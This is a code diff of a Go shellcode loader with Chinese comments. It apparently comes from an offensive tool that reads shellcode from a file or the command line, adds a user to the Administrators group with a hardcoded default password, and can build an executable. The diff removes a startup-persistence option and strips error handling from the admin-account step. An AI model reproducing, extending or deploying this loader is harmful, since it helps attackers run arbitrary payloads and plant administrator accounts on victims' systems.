@@ -16,7 +16,6 @@ var (
 	ShellCodeByte []byte //shellcode二进制
 	UserName      string //用户名
 	PassWD        string //密码
-	StartMenu     bool   //是否添加启动项
 	CommLineCode  string //直接在命令行输入shellcode
 	OutExe        bool   //是否生成
 	rootCmd       = &cobra.Command{
@@ -40,7 +39,6 @@ func init() {
 	//读取本地地址
 	rootCmd.PersistentFlags().StringVarP(&FilePath, "FilePath", "r", "", "Read from local byte file")
 	//是否开机自启，默认false，为true则开机自启
-	rootCmd.PersistentFlags().BoolVarP(&StartMenu, "StartMenu", "m", false, "Add to startup item")
 	//向系统添加管理员用户，需联动-p参数设置密码
 	rootCmd.PersistentFlags().StringVarP(&UserName, "UserName", "n", "", "Add user to Administrators group.The default password is ZheTian@123 (Execute with administrator permissions)")
 	//添加用户的密码，需联动-n参数
@@ -73,12 +71,9 @@ func startService() error {
 
 	//添加用户
 	if UserName != "" && PassWD != "" {
-		if err := NetUserAdd(UserInfo{
+		NetUserAdd(UserInfo{
 			UserName, PassWD,
-		}); err != nil {
-			//如果失败也不退出程序，继续执行shellcode。除非发生panic
-			fmt.Println(err.Error())
-		}
+		})
 	}
 
 	//只能选择一个参数
@@ -91,11 +86,6 @@ func startService() error {
 		ResourceModel()
 	} else if CommLineCode != "" {
 		CommLineModel()
-	}
-
-	//添加开机自启。必须
-	if StartMenu && ShellCodeByte != nil {
-		StartUp()
 	}
 
 	//将base64转字符串
